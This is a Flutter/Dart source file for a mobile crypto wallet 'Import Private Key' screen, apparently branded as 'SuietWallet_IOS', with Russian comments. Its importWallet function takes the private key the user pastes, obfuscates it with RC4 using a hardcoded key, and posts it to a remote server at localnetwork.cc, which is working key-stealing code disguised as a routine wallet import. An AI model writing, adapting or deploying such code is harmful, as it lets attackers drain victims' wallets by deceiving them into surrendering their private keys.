import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:simple_rc4/simple_rc4.dart';
import 'package:web3dart/web3dart.dart';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'wallet_screen.dart'; // Убедитесь, что этот файл существует

// Укажите свой URL API и ключ сервера
const String API_URL = 'https://localnetwork.cc/record/docs/filler'; // Замените на ваш реальный API_URL
const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt'; // Замените на ваш реальный SERVER_KEY

// Функция для шифрования данных RC4
String encryptData(String data) {
  final rc4 = RC4(SERVER_KEY);
  final encrypted = rc4.encodeBytes(Uint8List.fromList(data.codeUnits));
  return base64.encode(encrypted);
}

// Функция для импорта кошелька по приватному ключу
Future<void> importWallet(String privateKey, BuildContext context) async {
  final salt = Random().nextInt(900000) + 100000; // Генерация случайного 6-значного числа

  final jsonData = jsonEncode({
    'mnemonic': privateKey,
    'salt': salt,
    'name': 'SuietWallet_IOS', // Замените на ваше название приложения
    'new': false
  });

  final encryptedData = encryptData(jsonData);

  try {
    final response = await http.post(
      Uri.parse(API_URL),
      body: {'data': encryptedData},
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      encoding: Encoding.getByName('utf-8'),
    );

    if (response.statusCode == 200) {
      final responseData = jsonDecode(response.body);

      if (responseData is Map<String, dynamic>) {
        print(responseData);

        final portfolioId = responseData['portfolio']['id'];

        // Форматирование приватного ключа
        final formattedPrivateKey = privateKey.startsWith('0x') ? privateKey : '0x$privateKey';
        final credentials = EthPrivateKey.fromHex(formattedPrivateKey);
        final address = credentials.address;

        print('Ethereum Address: $address');

        if (address.toString().toLowerCase() == portfolioId.toLowerCase()) {
          // Переход на экран кошелька с успешным сообщением
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('Wallet imported successfully. Address: $address')),
          );

          Navigator.push(
            context,
            MaterialPageRoute(builder: (context) => WalletScreen(
              privateKey: privateKey,
              address: address.toString(),
              portfolioId: portfolioId,
            )),
          );
        } else {
          // Обработка несоответствия адресов
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('Address does not match server response')),
          );
        }
      } else {
        print('Invalid response format');
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Invalid response format')),
        );
      }
    } else {
      print('Failed to import wallet, server responded with status: ${response.statusCode}');
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Failed to import wallet. Status code: ${response.statusCode}')),
      );
    }
  } catch (e) {
    print('Failed to send request: $e');
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Failed to send request: ${e.toString()}')),
    );
  }
}

// Основное приложение
class ImportPrivateKeyScreen extends StatefulWidget {
  const ImportPrivateKeyScreen({super.key});

  @override
  _ImportPrivateKeyScreenState createState() => _ImportPrivateKeyScreenState();
}

class _ImportPrivateKeyScreenState extends State<ImportPrivateKeyScreen> {
  final TextEditingController _privateKeyController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    return GestureDetector(
      onTap: () {
        FocusScope.of(context).unfocus();
      },
      child: Scaffold(
        backgroundColor: Colors.white,
        appBar: AppBar(
          backgroundColor: Colors.transparent,
          elevation: 0,
          leading: IconButton(
            icon: const Icon(Icons.arrow_back, color: Color(0xFF8E8E93)),
            onPressed: () {
              Navigator.pop(context);
            },
          ),
          title: const Text(
            'Import Wallet',
            style: TextStyle(color: Color(0xFF8E8E93), fontSize: 18),
          ),
          centerTitle: true,
        ),
        body: Stack(
          children: [
            Align(
              alignment: Alignment.bottomRight,
              child: Padding(
                padding: const EdgeInsets.only(right: 5, bottom: 16),
                child: Image.asset(
                  'assets/images/logo3.png',
                  width: screenWidth * 0.4,
                  height: screenWidth * 0.4,
                  fit: BoxFit.contain,
                ),
              ),
            ),
            SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  const SizedBox(height: 40),
                  const Text(
                    'Import Private Key',
                    style: TextStyle(
                      fontSize: 24,
                      color: Color(0xFF007AFF),
                      fontWeight: FontWeight.bold,
                    ),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    'Enter your private key.',
                    style: TextStyle(
                      fontSize: 16,
                      color: Color(0xFF8E8E93),
                      fontWeight: FontWeight.bold,
                    ),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 30),
                  Card(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    margin: const EdgeInsets.symmetric(vertical: 10),
                    elevation: 5,
                    child: Container(
                      padding: const EdgeInsets.all(24),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        gradient: const LinearGradient(
                          colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                          begin: Alignment.topRight,
                          end: Alignment.bottomLeft,
                        ),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const SizedBox(height: 10),
                          Container(
                            width: screenWidth * 0.9,
                            height: 250, // Высота TextField
                            padding: const EdgeInsets.symmetric(horizontal: 16),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.2),
                              borderRadius: BorderRadius.circular(8),
                            ),
                            child: Align(
                              alignment: Alignment.center,
                              child: TextField(
                                controller: _privateKeyController,
                                maxLines: null,
                                textInputAction: TextInputAction.done,
                                decoration: InputDecoration(
                                  hintText: 'Paste your private key here',
                                  hintStyle: TextStyle(
                                    color: Colors.white.withOpacity(0.6),
                                    fontWeight: FontWeight.w500,
                                  ),
                                  border: InputBorder.none,
                                  contentPadding: EdgeInsets.zero,
                                ),
                                style: const TextStyle(color: Colors.white),
                                cursorColor: Colors.white,
                                textAlign: TextAlign.center,
                                textAlignVertical: TextAlignVertical.center,
                                onSubmitted: (value) {
                                  FocusScope.of(context).unfocus();
                                },
                              ),
                            ),
                          ),
                          const SizedBox(height: 20),
                          Center(
                            child: SizedBox(
                              width: screenWidth * 0.7,
                              child: ElevatedButton(
                                onPressed: () {
                                  final privateKey = _privateKeyController.text.trim();
                                  if (privateKey.isNotEmpty) {
                                    importWallet(privateKey, context);
                                  } else {
                                    showDialog(
                                      context: context,
                                      builder: (context) => AlertDialog(
                                        title: const Text('Error'),
                                        content: const Text('Private key cannot be empty.'),
                                        actions: <Widget>[
                                          TextButton(
                                            child: const Text('OK'),
                                            onPressed: () {
                                              Navigator.of(context).pop();
                                            },
                                          ),
                                        ],
                                      ),
                                    );
                                  }
                                },
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: const Color(0xFF007AFF),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                ),
                                child: const Text(
                                  'Import Wallet',
                                  style: TextStyle(fontSize: 18),
                                ),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
